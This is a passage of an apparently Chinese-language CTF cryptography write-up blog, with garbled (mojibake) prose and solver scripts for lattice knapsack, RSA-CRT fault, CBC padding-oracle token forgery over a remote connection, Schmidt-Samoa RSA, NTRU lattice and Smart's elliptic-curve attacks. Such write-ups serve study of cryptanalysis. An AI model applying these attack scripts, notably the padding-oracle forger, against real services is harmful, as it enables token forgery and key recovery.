2393101447609058423972930395701691663427846813221239320934606678459413504768644926181460017799519382449397718313025961069893544988479646385919424405779326117178588032903929941862027150270119711598802163480952922120187094718686898939410748317800523138265797423665663221828132875519135258017417196723394991589, 2076619377477031848639856175879543470343734230329455509726069209675934720306012788659428906143908031714533138217029168088704862709255685909509412415865310492415529179862803114166904885039563512848807162958978688888862433736068791165778446148630009314317367780254227290580067976686185051291022979661750915754, 3491077294883860264163831470480731798100952316266751074114141651012550304283058960434530180849262526809044918444772385895477880956597558643610336430554267189540135235980259742427410947649578494040773591269499992232386779146605217149697181339334540183232972164203652901657790093101500810462049416615463177546, 1900282698989463723132580002213591610224600569598698293743548176893816262621986651465369623867470701906655323671861637049755140533957531464521427859781669543880016267139703210772613428562790216713087985891753909255158869760207735542707780506499364324239566426940858870670235658504146842251118347853718573687, 845835496189376653886150062538136220529949512316837843552683019639478239138823063495130985204374692468338372257263301271462502177444656561614715214184613422656425547782261460936839766389042333921944045616045486642969616735714861351814153114962802762127416684363023821783147694935652388700962068809263643389, 1692948566193147198415868174132947385960361457234775960996688163030768614452245060590761872803325778389788629611003585774682395160900493537852600395064146263629935684962163363737792411465123735249475890890275593935918443912139384104086401671117297441852839961645132964273067219203682142732326663844844075005, 3901970947731392475716050740298719400950276818247119306832129595796167756242376176561993909746155516755870152152426215315380852798393154894808746740712267603715980983656834079622454549206763317947354722296743984624987127611181689458009296361053627284630345662893605480665829929447703677978777309463029378417, 1577043788886187395642609069164097976028680286900550453860267666151053881614552629192152797547831199391087342194362363394388982584111597031153132134424331287494091263926113657497887818333781008531372953107929672293402747435497312779887642688714378020998413789750803772540267677934581148808295413525216136803, 3276002168563401469280187929611647305197543429976350427130738049281707438362184511160108432124838733957215323976050672988158715407342981430458842450708646678151269772750534404161450465011318453684449149908734823528246992684797781800055195681433678035768369610420102397884004628356347672352589330168248485654, 4411009177016980725472022463786638290635658962658405430390446282357905517369354153749556317880287891619728551571365291772228008250807956164974455402362384308494347027623477843175153409603882541941337758836671784172488496488754902131790649458047942214547960790875638234105693707598046416061433722602277417913, 726307210260821049373144992154409948345637635368877092819523015622922973757990798665952122937220928090928915580354873566840841334710321751558673510023725557920994744241558993161607005593746962259280610204185140150932218256262971149625050424081864893903080125492194257806289021889420725960087352176605476401, 3693547596900043741100931793124522047704999510924569121382660670034074764908100421156413899466991914742739196108134269694588165114035371129093570934464583558551757548295216503767696894203692851680949073578461575940202069273789808433835247367833648763742770751275454183762387380512531453133282161136891481929, 3665167482952187096160406260284763362510646804687123748116392784543398398279641171604017029973718130518368590622397871178112956392132585354286995099639634346724159039575980422514838700663255651434551797666622249188660622202211877423560216079734584070335703175927475594016858689649422345026726688518192776409, 3177225879939950395651618993805008222412532118788273586156368076266815187233402783969056213942565660008399569335649908751056924645159655412260822319346140671522760303386912674853426818989655804583118735050488807630342254022038941207363968463486349805992873818522316215108897954229670433933723727953745569923, 3779028950209214447433161167866672177270317911040016153565684362868472897920954128667548298875972509713229980453212868866709806350382879548859304441713862617068673359830166023396799623627580164606085346085586198750311774006643094309383771953620689844976832117988296867004302713999531851905939505561391164191, 1565404281114657156315837816758658026233033173060800317005770893567963194302658801484623389662992305672382398023818850068525864828775625430086172113834590761904637783666223747194948578977291563029119331359772126904299450508763826664055472843841614023374884939978267540166731011979458675326635019791695565262, 4590612706732938257980684733418322154816988549292312878809124257236458054000997655804894335759227339962003988227969894859099164186023473343838474896521750585481368380309987345243249527717514650369578965067712448623509794751079446662740247787522802157146979933561737569581462646401210202611137277719776325874, 4656134044766857450597560240558144676752410910811435167749159091161696894834586087615774989757513667092954856468407760017560542136316715670693777783679558119131401055537286285519362471310101802489073198581136126447904865719977268401545732467435790881584291255625228947956711968019016045126232778925003004330, 1302442060464287844140958699896819274375020008729351597230040891362445067421212462957400958722642791768192657008363675587123266689147607759102472970553121277399742938912421426476562987172511600083704255430238284187551952036180307899091818953207131942020689197031040878798574298241042445489355623641304509901, 1713371877870224703630049314762946474778920435955283834739126207078713464668904026594605513305271384038631655087342898588084451349187868588684801874090865404001866704899244865655209470792718001015037577763825373010785137282706266173729073167176023660411002299453317075113416538613782092969312114363570614517, 3637726819689145119298859324222689829348828654379242284522514186534374907105449951789577704447855700484656693611649650849292507621631154875853657102526884725384668206346033815730075251973202378946655675542205955142413874296868545263385884125877782563979657700695334466662362949444188725774579230310152088275, 2158102278530231087495034471822326358570676636562730292269287971780457035415439398154664393611400939934545917849558224030371421867959640393291189526256769127344213191071939008079603466136176333380110183758543653357694387470236768742232731622566892872043474084829437398364701172310088532750048770269284101440, 1357917511517266002753494995174534483863311462321496912444365910532975757440009039109426669425460450718165016869719113431933081156266889995971449973598815991564815927350509938427923107101552779751422733194897338044578854890945368216930911437462116835554456903232462472222161348181958293840928247406557674974, 2251018060294798208546405609149289070988382731157357021632370786567727415247731970083169483820553902016645411129588563627592996984294288337792592520936877108974148008787194317828561698272728745048340731096531990558473233518197391710380846601332446583691529730716812953431975867169637715185113349221752268933, 1482068954689822886842025936245442918811660979248644510861339518658861807617708511787281929243096751044401436667087259365497421213702452919894081994558259251364044857153958318631770890533563020667069772553910132699365629867005612637922185970987117180360664807199834536264073950978308314028235946030457178450]</span><br><span class="line">n = len(k)</span><br><span class="line">L = matrix.zero(n + 1)</span><br><span class="line">for row, x in enumerate(k):    </span><br><span class="line">    L[row, row] = 2    </span><br><span class="line">    L[row, -1] = x</span><br><span class="line">L[-1, :] = 1</span><br><span class="line">L[-1, -1] = c</span><br><span class="line">print(L.LLL())</span><br><span class="line">data = &quot;&quot;&quot;</span><br><span class="line">-1   -1    1    1   -1   -1    1    1   -1   -1    1   -1   -1    1    1    1   -1   -1    </span><br><span class="line">1    1    1    1   -1    1   -1   -1    1    1   -1   -1   -1    1   -1   -1   -1   -1   </span><br><span class="line">1   -1   -1    1   -1    1    1   -1   -1    1    1    1   -1   -1    1    1    1    1   </span><br><span class="line">-1    1   -1   -1   -1    1   -1    1    1    1   -1   -1   -1    1   -1    1    1    1   </span><br><span class="line">-1   -1    1   -1    1    1   -1    1   -1   -1    1    1    1   -1   -1    1   -1   -1   </span><br><span class="line">1    1   -1    1   -1    1   -1    1   -1   -1   -1   -1   -1    1   -1   -1   -1    1    </span><br><span class="line">1   -1    1    1   -1   -1    1    1   -1    1   -1    1   -1   -1    1    1   -1    1 </span><br><span class="line">1    1   -1   -1   -1    1   -1    1   -1    1   -1   -1    1    1    1   -1   -1    1</span><br><span class="line">-1   -1   -1    1   -1    1    1    1   -1   -1    1   -1    1    1   -1    1   -1   -1  </span><br><span class="line">1   -1   -1   -1   -1    1   -1   -1    1   -1   -1   -1    1    1    1   -1    1    1</span><br><span class="line">1   -1   -1    1   -1   -1    1    1    1   -1   -1    1    1   -1   -1    1    1   -1</span><br><span class="line">-1    1    1   -1   -1    1   -1   -1    1    1    1   -1   -1    1   -1   -1    1    1</span><br><span class="line">1   -1   -1    1    1   -1    1    1    1   -1   -1    1   -1    1   -1    1    1   -1  </span><br><span class="line">-1    1   -1    1    1    1    1   -1   -1    1    1    1   -1    1   -1   -1   -1   -1  </span><br><span class="line">-1    1   -1    0&quot;&quot;&quot;.strip(&#x27;\n&#x27;).split(&quot; &quot;)</span><br><span class="line">flag = []</span><br><span class="line">for t in data:    </span><br><span class="line">    if t == &quot;&quot;:        </span><br><span class="line">        continue    </span><br><span class="line">    if t == &quot;-1&quot;:        </span><br><span class="line">        flag.append(&#x27;1&#x27;)    </span><br><span class="line">    else:        </span><br><span class="line">        flag.append(&#x27;0&#x27;)</span><br><span class="line">flag = &quot;&quot;.join(flag)[:-1]</span><br><span class="line">print(long_to_bytes(int(flag,2)))</span><br></pre></td></tr></table></figure>
<h3 id="eazy-crt"><a href="#eazy-crt" class="headerlink" title="eazy_crt"></a>eazy_crt</h3><p>RSA-CRT fault attack<br><a target="_blank" rel="noopener" href="https://www.infocomm-journal.com/cjnis/article/2019/2096-109x/2096-109x-5-1-00030.shtml">https://www.infocomm-journal.com/cjnis/article/2019/2096-109x/2096-109x-5-1-00030.shtml</a><br>$S_{_}=S_{q}+(q<em>r2)</em>(inverse(q<em>r2,p</em>r1)<em>(S_{p}-S_{q})mod\ (p</em>r1))$<br>$æ³¨æ„åˆ°ï¼Œ(q<em>r2)</em>(inverse(q<em>r2,p</em>r1)$<br>$æ‰€ä»¥ï¼Œæˆ‘ä»¬æœ‰S_{_}=S_{p}mod\ (p<em>r1)$<br>$å¯å¾—ï¼ŒS_{_}=S_{p}mod\ p$<br>$S_{_}-S_{p}|n=pï¼Œæ¥ä¸‹æ¥æ‰¾å‡ºS_{p}å³å¯$<br>$S_{p}=(m+getPrime(10))^{dp}mod\ (p</em>r1)ï¼Œå¯è½¬åŒ–ä¸ºæ¨¡pä¸‹çš„S_{p}$<br>$é‚£ä¹ˆï¼Œ(S_{p})^e=(m+x)mod\ pï¼ŒS_{_}åŒç†$<br>$æˆ‘ä»¬å¯å¾—ï¼Œ(S_{_})^e-m-x|n=pï¼Œæ‰€ä»¥éœ€è¦å¯¹xè¿›è¡Œçˆ†ç ´$</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = <span class="number">2180240512138982889935733758776025289492848542072999905411903898302427496814336475436552230920326681809745778470583226987</span></span><br><span class="line">n = <span class="number">25505131259827344749407187081729819350996141100990518281765117676936124636084125400315049858697199427401342785804654120926568235761577895862889807660442415521870277729420875825744007886870384790308986342360349597392841568418588521694478184632631896474390291958350681472768485356865513284619086754437723630874827593280089682939629265210875169009057935264259019861755270570945614034505771690412042781423771110441028258110022746603974882162934979726300741541857444013708508946471384525030286343828680432038605288717842755346907256658746733811881247992925881684393431852248253701825024590345480994598867741811599162649467</span></span><br><span class="line">S_ = <span class="number">5510086561842250138908875342533294108331951659612671466695801343686972919443402163401521040457640602756777910081639191753436122171756174730531385913865951826869995984787102439679170684422717808771260217541439878677750508065703064081375473845405916674327932798153100574555933448570618732842365795738120491532398081467312017203933413296779070611024124965772787502242499016884537233028947865288037718074352448773759363242111080540630360902388540661831992776707600133253329779003707938065020121645530719140954554800986771763343191398210100325971573069812381693089384221441735278736889673500218274673196333806222266248844379127652366</span></span><br><span class="line">S = <span class="number">11422623501509574650959962952004985925543723972567988534433510888436662069119800576321679344425052011563473005275801787271861671898318523033415642388512047035650991047953319601346912194462122313366888126100093635969476696871403883687946617575837061694813669883782221006701704487938500886952347003631626326127154081787016692856628561200386941683756397734100698520464199249811238013146899352390453500132666840606585760306723894654933077094375810666168464835756607377998959675132305971721109661644231613426322675350973373434138686086023265910883509514575554429502214217460059521619625693750938117427832654792355808803321</span></span><br><span class="line">ss = <span class="built_in">pow</span>(S_, e, n) - m</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span> &lt;&lt; <span class="number">10</span>):</span><br><span class="line">    p = GCD(ss - x, n)</span><br><span class="line">    <span class="keyword">if</span> p != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">q = n//p</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + md5(<span class="built_in">str</span>(p).encode()).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + md5(<span class="built_in">str</span>(q).encode()).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>å…¶å®ï¼Œ<code>x=0</code>ï¼Œè¿™è·Ÿè®ºæ–‡æ˜¯ä¸€æ ·çš„<br><img src="https://pic1.zhimg.com/80/v2-a2e64b48d5d963c2353c9edf510ccdf6_1440w.png" alt=""></p>
<h3 id="Door"><a href="#Door" class="headerlink" title="Door"></a>Door</h3><p>å˜¶ï¼ŒçœŸä¸ç†Ÿè¿™ä¸ªAES-CBCçš„ç›¸å…³æ”»å‡»ï¼Œçœ‹çœ‹å®˜æ–¹è§£é‡Šï¼Œå¾—ä»¥åå†å›å¤´çœ‹çœ‹å§<br><a target="_blank" rel="noopener" href="https://goodapple.top/archives/217">https://goodapple.top/archives/217</a><br>CBCå­—èŠ‚ç¿»è½¬æ”»å‡»<br>æœåŠ¡ç«¯ä¼šæŠŠå¯†æ–‡è§£å¯†ä¹‹åçš„å¡«å……çŠ¶æ€è¿”å›ï¼Œ é‚£ä¹ˆæˆ‘ä»¬åªè¦æ§åˆ¶ivï¼Œ ä½¿å¾—è§£å¯†ä¹‹åçš„æ˜æ–‡äº§ç”Ÿâ€â€¦\x01â€, â€œâ€¦\x02\x02â€ â€¦çš„çŠ¶æ€ï¼Œè·å¾—æ˜æ–‡ä¸ºâ€\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10â€å¯¹åº”çš„IVï¼Œ ç„¶ååˆ©ç”¨xoræŠŠæˆ‘ä»¬æƒ³è¦è¾“å…¥çš„å†…å®¹åˆå¹¶åˆ°è¿™ä¸ªIVé‡Œé¢</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">r = remote(host, port)</span><br><span class="line">auth_code = urandom(<span class="number">16</span>)</span><br><span class="line">token = urandom(<span class="number">16</span>)</span><br><span class="line">diff = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="number">16</span>)):    </span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">256</span>)):        </span><br><span class="line">        diff[i] = b        </span><br><span class="line">        tmp_tk = xor(token, <span class="built_in">bytes</span>(diff))        </span><br><span class="line">        r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)        </span><br><span class="line">        r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, tmp_tk.<span class="built_in">hex</span>().encode())        </span><br><span class="line">        r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, auth_code.<span class="built_in">hex</span>().encode())        </span><br><span class="line">        res = r.recvline()        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;out&#x27;</span> <span class="keyword">in</span> res:            </span><br><span class="line">            <span class="keyword">if</span> i != <span class="number">0</span>:                </span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, <span class="number">16</span>):                    </span><br><span class="line">                    diff[j] ^= (<span class="number">16</span> - i) ^ (<span class="number">16</span> - i + <span class="number">1</span>)            </span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">forged_token = xor(token, <span class="built_in">bytes</span>(diff))</span><br><span class="line">forged_token = xor(forged_token, <span class="string">b&#x27;\x10&#x27;</span> * <span class="number">16</span>)</span><br><span class="line">forged_token = xor(forged_token, pad(<span class="string">b&#x27;SoNP#1033&#x27;</span>, <span class="number">16</span>))</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, forged_token.<span class="built_in">hex</span>().encode())</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, auth_code.<span class="built_in">hex</span>().encode())</span><br><span class="line">r.interactive()</span><br><span class="line"><span class="comment">#flag&#123;d0_n0t_3xpose_th3_padd1ng_5tatus&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="week4-1"><a href="#week4-1" class="headerlink" title="week4"></a>week4</h2><h3 id="RSA-Variation-II"><a href="#RSA-Variation-II" class="headerlink" title="RSA Variation II"></a>RSA Variation II</h3><p>RSAè¿›é˜¶æ”»å‡»æ–¹å¼ï¼Œ<code>Schmidt Samoa</code>å¯†ç ä½“ç³»<br>$N=p^{2}<em>q$<br>$d</em>N\equiv 1\ mod\ \phi(p<em>q)$<br>$c=m^{N}(mod\ N)$<br>$m=c^{d}(mod\ p</em>q)$<br>$ä»»å–ä¸€ä¸ªa(ä¸€èˆ¬ä¸º2)ï¼Œa^{Nd}=a^{k<em>(p-1)</em>(q-1)+1}=a(mod\ p<em>q)$<br>$a^{Nd}-a|p</em>q$<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/vconlln/p/17066497.html">https://www.cnblogs.com/vconlln/p/17066497.html</a><br>è¿™é‡Œæˆ‘ä»¬åªéœ€è·å–åˆ°<code>p*q</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">1653396627113549535760516503668455111392369905404419847336187180051939350514408518095369852411718553340156505246372037811032919080426885042549723125598742783778413642221563616358386699697645814225855089454045984443096447166740882693228043505960011332616740785976743150624114653594631779427044055729185392854961786323215146318588164139423925400772680226861699990332420246447180631417523181196631188540323779487858453719444807515638025771586275969579201806909799448813112034867089866513864971414742370516244653259347267231436131850871346106316007958256749016599758599549180907260093080500469394473142003147643172770078092713912200110043214435078277125844112816260967490086038358669788006182833272351526796228536135638071670829206746835346784997437044707950580087067666459222916040902038574157577881880027391425763503693184264104932693985833980182986816664377018507487697769866530103927375926578569947076633923873193100147751463</span></span><br><span class="line">N = <span class="number">1768427447158131856514034889456397424027937796617829756303525705316152314769129050888899742667986532346611229157207778487065194513722005516611969754197481310330149721054855689646133721600838194741123290410384315980339516947257172981002480414254023253269098539962527834174781356657779988761754582343096332391763560921491414520707112852896782970123018263505426447126195645371941116395659369152654368118569516482251442513192892626222576419747048343942947570016045016127917578272819812760632788343321742583353340158009324794626006731057267603803701663256706597904789047060978427573361035171008822467120148227698893238773305320215769410594974360573727150122036666987718934166622785421464647946084162895084248352643721808444370307254417501852264572985908550839933862563001186477021313236113690793843893640190378131373214104044465633483953616402680853776480712599669132572907096151664916118185486737463253559093537311036517461749439</span></span><br><span class="line">d = <span class="number">20650646933118544225095544552373007455928574480175801658168105227037950105642248948645762488881219576174131624593293487325329703919313156659700002234392400636474610143032745113473842675857323774566945229148664969659797779146488402588937762391470971617163496433008501858907585683428652637958844902909796849080799141999490231877378863244093900363251415972834146031490928923962271054053278056347181254936750536280638321211545167520935870220829786490686826062142415755063724639110568511969041175019898031990455911525941036727091961083201123910761290998968240338217895275414072475701909497518616112236380389851984377079</span></span><br><span class="line">pq = GCD(<span class="built_in">pow</span>(<span class="number">2</span>, d*N, N)-<span class="number">2</span>, N)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c, d, pq))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h3 id="babyNTRU"><a href="#babyNTRU" class="headerlink" title="babyNTRU"></a>babyNTRU</h3><p>é¢˜ç›®æºç </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">q = getPrime(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line">f = getPrime(<span class="number">1024</span>)</span><br><span class="line">g = getPrime(<span class="number">768</span>)</span><br><span class="line"></span><br><span class="line">h = (inverse(f, q) * g) % q</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">e = (getPrime(<span class="number">32</span>) * h + m) % q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>((h, q))</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (8916452722821418463248726825721257021744194286874706915832444631771596616116491775091473142798867278598586482678387668986764461265131119164500473719939894343163496325556340181429675937641495981353857724627081847304246987074303722642172988864138967404024201246050387152854001746763104417773214408906879366958729744259612777257542351501592019483745621824894790096639205771421560295175633152877667720038396154571697861326821483170835238092879747297506606983322890706220824261581533324824858599082611886026668788577757970984892292609271082176311433507931993672945925883985629311514143607457603297458439759594085898425992, 31985842636498685945330905726539498901443694955736332073639744466389039373143618920511122288844282849407290205804991634167816417468703459229138891348115191921395278336695684210437130681337971686008048054340499654721317721241239990701099685207253476642931586563363638141636011941268962999641130263828151538489139254625099330199557503153680089387538863574480134898211311252227463870838947777479309928195791241005127445821671684607237706849308372923372795573732000365072815112119533702614620325238183899266147682193892866330678076925199674554569018103164228278742151778832319406135513140669049734660019551179692615505961)</span></span><br><span class="line"><span class="comment"># 20041713613876382007969284056698149007154248857420752520496829246324512197188211029665990713599667984019715503486507126224558092176392282486689347953069815123212779090783909545244160318938357529307482025697769394114967028564546355310883670462197528011181768588878447856875173263800885048676190978206851268887445527785387532167370943745180538168965461612097037041570912365648125449804109299630958840398397721916860876687808474004391843869813396858468730877627733234832744328768443830669469345926766882446378765847334421595034470639171397587395341977453536859946410431252287203312913117023084978959318406160721042580688</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ—¶å€™çœ‹è§è¿™é¢˜ï¼Œæˆ‘å¥½åƒåœ¨å¯’å‡çš„æ—¶å€™ä¹Ÿè§è¿‡ç±»ä¼¼çš„ï¼Œå½“æ—¶æ‰¾äº†ç¯‡æ–‡ç« (å¥½åƒä¸æ˜¯æ„é€ æ ¼)ï¼Œä½†æ˜¯æ²¡åšå‡ºæ¥ï¼Œemmmï¼Œåº”è¯¥æ‰¾é”™äº†<br>ä¸‹é¢çš„åšå®¢é‡Œæœ‰å¤§ä½¬å‡ é“æ ¼å¯†ç çš„å­¦ä¹ <br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_74345946/article/details/131742665">https://blog.csdn.net/m0_74345946/article/details/131742665</a></p>
<p>$h=f^{-1}<em>g(mod\ q)$<br>$e=(x</em>h+m)mod\ q$<br>$æœ‰ï¼Œe=(x<em>f^{-1}</em>g+m)mod\ q$<br>$e<em>f=(x</em>g+m<em>f)mod\ q$<br>$æƒ³åŠæ³•æŠŠè¿™ä¸ªxå»æ‰ï¼Œm</em>f=((e<em>f)mod\ q)mod\ g$<br>$m=(((e</em>f)mod\ q)<em>f^{-1})mod\ g$<br>$è‡³æ­¤ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“f,gï¼ŒåŒæ—¶ï¼Œh,qæ˜¯å·²çŸ¥çš„$<br>$g=k</em>q+h*fï¼Œæ„é€ æ ¼$</p>
<script type="math/tex; mode=display">
\left [ \begin{matrix}
k&f\\
\end{matrix} \right ] 
*
\left [ \begin{matrix}
q&0\\
h&1\\
\end{matrix} \right ] 
\ =
\left [ \begin{matrix}
g&f\\
\end{matrix} \right ]</script><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">q = 31985842636498685945330905726539498901443694955736332073639744466389039373143618920511122288844282849407290205804991634167816417468703459229138891348115191921395278336695684210437130681337971686008048054340499654721317721241239990701099685207253476642931586563363638141636011941268962999641130263828151538489139254625099330199557503153680089387538863574480134898211311252227463870838947777479309928195791241005127445821671684607237706849308372923372795573732000365072815112119533702614620325238183899266147682193892866330678076925199674554569018103164228278742151778832319406135513140669049734660019551179692615505961</span><br><span class="line">h = 8916452722821418463248726825721257021744194286874706915832444631771596616116491775091473142798867278598586482678387668986764461265131119164500473719939894343163496325556340181429675937641495981353857724627081847304246987074303722642172988864138967404024201246050387152854001746763104417773214408906879366958729744259612777257542351501592019483745621824894790096639205771421560295175633152877667720038396154571697861326821483170835238092879747297506606983322890706220824261581533324824858599082611886026668788577757970984892292609271082176311433507931993672945925883985629311514143607457603297458439759594085898425992</span><br><span class="line">e = 20041713613876382007969284056698149007154248857420752520496829246324512197188211029665990713599667984019715503486507126224558092176392282486689347953069815123212779090783909545244160318938357529307482025697769394114967028564546355310883670462197528011181768588878447856875173263800885048676190978206851268887445527785387532167370943745180538168965461612097037041570912365648125449804109299630958840398397721916860876687808474004391843869813396858468730877627733234832744328768443830669469345926766882446378765847334421595034470639171397587395341977453536859946410431252287203312913117023084978959318406160721042580688</span><br><span class="line">mat = [[q,0], [h, 1]]</span><br><span class="line">M = Matrix(ZZ, mat)</span><br><span class="line">g, f = M.LLL()[0]</span><br><span class="line"></span><br><span class="line">m = (f * e % q * inverse(f, g)) % g</span><br><span class="line">flag = long_to_bytes(int(m))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<h3 id="Smart"><a href="#Smart" class="headerlink" title="Smart"></a>Smart</h3><p>é¢˜ç›®æºç </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = <span class="number">75206427479775622966537995406541077245842499523456803092204668034148875719001</span></span><br><span class="line">a = <span class="number">40399280641537685263236367744605671534251002649301968428998107181223348036480</span></span><br><span class="line">b = <span class="number">34830673418515139976377184302022321848201537906033092355749226925568830384464</span></span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line"></span><br><span class="line">d = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">G = E.random_element()</span><br><span class="line"></span><br><span class="line">P = d * G</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(G)</span><br><span class="line"><span class="built_in">print</span>(P)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (63199291976729017585116731422181573663076311513240158412108878460234764025898 : 11977959928854309700611217102917186587242105343137383979364679606977824228558 : 1)</span></span><br><span class="line"><span class="comment"># (75017275378438543246214954287362349176908042127439117734318700769768512624429 : 39521483276009738115474714281626894361123804837783117725653243818498259351984 : 1)</span></span><br></pre></td></tr></table></figure>
<p>æ¤­åœ†æ›²çº¿ä¸Šçš„ç¦»æ•£å¯¹æ•°ç®—æ³•(ECDLP)<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/blackicelisa/p/15315636.html#%E4%B8%89%E3%80%81%E9%98%B6%E6%95%B0%E4%B8%8Ep%E7%9B%B8%E7%AD%89%E9%87%87%E7%94%A8smart">https://www.cnblogs.com/blackicelisa/p/15315636.html#%E4%B8%89%E3%80%81%E9%98%B6%E6%95%B0%E4%B8%8Ep%E7%9B%B8%E7%AD%89%E9%87%87%E7%94%A8smart</a><br><code>ECC smart&#39;s attack</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">p = 75206427479775622966537995406541077245842499523456803092204668034148875719001</span><br><span class="line">a = 40399280641537685263236367744605671534251002649301968428998107181223348036480</span><br><span class="line">b = 34830673418515139976377184302022321848201537906033092355749226925568830384464</span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">G = (63199291976729017585116731422181573663076311513240158412108878460234764025898,</span><br><span class="line">     11977959928854309700611217102917186587242105343137383979364679606977824228558)</span><br><span class="line">P = (75017275378438543246214954287362349176908042127439117734318700769768512624429,</span><br><span class="line">     39521483276009738115474714281626894361123804837783117725653243818498259351984)</span><br><span class="line"></span><br><span class="line">G = E(G)</span><br><span class="line">P = E(P)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def SmartAttack(P, Q, p):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(</span><br><span class="line">        Qp(p, 2), [ZZ(t) + randint(0, p)*p for t in E.a_invariants()])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True)</span><br><span class="line">    for P_Qp in P_Qps:</span><br><span class="line">        if GF(p)(P_Qp.xy()[1]) == P.xy()[1]:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True)</span><br><span class="line">    for Q_Qp in Q_Qps:</span><br><span class="line">        if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P, y_P = p_times_P.xy()</span><br><span class="line">    x_Q, y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    return ZZ(k)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = SmartAttack(G, P, p)</span><br><span class="line">print(long_to_bytes(d))</span><br></pre></td></tr></table></figure>
<h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p>æºç </p>
